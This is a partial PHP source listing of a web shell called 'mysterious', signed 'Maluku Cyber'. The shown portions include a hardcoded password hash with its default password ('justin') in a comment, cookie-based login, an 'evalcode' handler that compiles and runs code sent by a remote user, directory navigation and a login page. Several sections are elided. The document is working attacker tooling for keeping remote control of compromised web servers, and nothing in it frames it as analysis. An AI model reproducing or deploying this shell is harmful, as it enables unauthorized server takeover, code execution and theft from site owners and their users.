...
$s_pass = "bbf31cdadeead97c3ce6a48e20c9ccd5ba9502ac"; // default password : justin (login and change to new password)

$s_ver = "cyber"; // shell ver
$s_title = "mysterious ".$s_ver; // shell title
...
if(strlen(trim($s_pass))>0){
    if(isset($_COOKIE['mysterious'])){
        if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['mysterious']))) $s_auth = true;
    }
    if(isset($_GP['login'])){
        $s_login = kript($_GP['login']);
        if(strtolower(trim($s_pass)) == $s_login){
            setcookie("mysterious",$s_login,time() + $s_login_time);
            $s_auth = true;
        }
    }
    if(isset($_GP['x']) && ($_GP['x']=='logout')){
        $persist = array("theme", "cwd");
        $s_reload = (isset($_COOKIE['mysterious_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
...
if(isset($_COOKIE['mysterious_included'])){
    if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
    else{
        $s_self = "?";
        setcookie("mysterious_included", "0" ,time() - $s_login_time);
    ...
    if(strcmp($s_cek1,$s_cek2)!=0){
        ...
        setcookie("mysterious_included", "1" ,time() + $s_login_time);
        setcookie("s_self", $s_self ,time() + $s_login_time);
    }
    else{
        $s_self = "?";
        ...
        if(isset($_GP['evalcode'])){
            ...
            elseif(strtolower($s_lang)=='java'){
                if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
                    ...
                    $s_rand = "mysterious_".substr(md5(time().rand(0,100)),0,8);
                    $s_script = $s_rand;
...
<?php if($s_auth){?>
    ...
    <?php }
    ?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>mysterious</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>   <td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
...
<table align="center">
    <tr>
        <td>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png" width="200px" height="200px" />
        </td>
    </tr>
</table>
    ...
    mysterious&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
    <input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />
    </form>
    </div>
<?php }?>   </td></tr></table>
<p class='footer'><span style="color: red">Maluku</span> <span style="color: white">Cyber</span> <span style="color: red">&copy;<?php echo @date("Y",time())." "; ?></span> <span style="color: white">mysterious</span></p>
<?php echo $main_scs;?>
